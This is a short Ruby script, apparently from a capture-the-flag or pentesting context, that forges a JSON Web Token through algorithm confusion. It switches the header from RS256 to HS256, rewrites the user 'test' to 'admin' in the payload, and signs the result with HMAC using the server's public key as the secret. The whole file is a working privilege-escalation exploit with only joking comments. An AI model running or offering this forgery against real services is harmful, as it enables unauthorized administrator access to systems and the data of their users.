require 'base64'
require 'openssl'


pub = File.open("public.pem").read

Token ="Input_Json_Web_Token" #change this

header, payload, signature = Token.split('.')

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256", "HS256")
puts decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=","")

# Stop stalking
# lol

decoded_payload = Base64.decode64(payload)
decoded_payload.gsub!("test", "admin") 
puts decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")


data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))

puts data+"."+signature

